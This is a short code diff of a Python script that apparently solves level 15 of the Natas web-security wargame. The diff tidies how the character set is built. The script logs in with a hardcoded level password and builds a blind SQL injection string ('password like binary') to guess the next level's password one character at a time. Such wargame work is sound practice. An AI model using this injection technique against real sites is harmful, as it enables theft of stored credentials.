@@ -1,3 +1,5 @@
+import string
+
 import mechanize
 
 br = mechanize.Browser()
@@ -10,13 +12,7 @@ br.add_password(natas15, "natas15", "7h15154h3lL0f4p455w0rD")
 br.open(natas15)
 form = (br.forms()).next()
 
-chlist = []
-for i in range(26):
-    chlist.append(chr(i+65))
-    chlist.append(chr(i+97))
-
-for i in range(10):
-    chlist.append(chr(i+48))
+chlist = string.letters + string.digits
 
 st = ''
 base_string = 'natas16" and password like binary "'
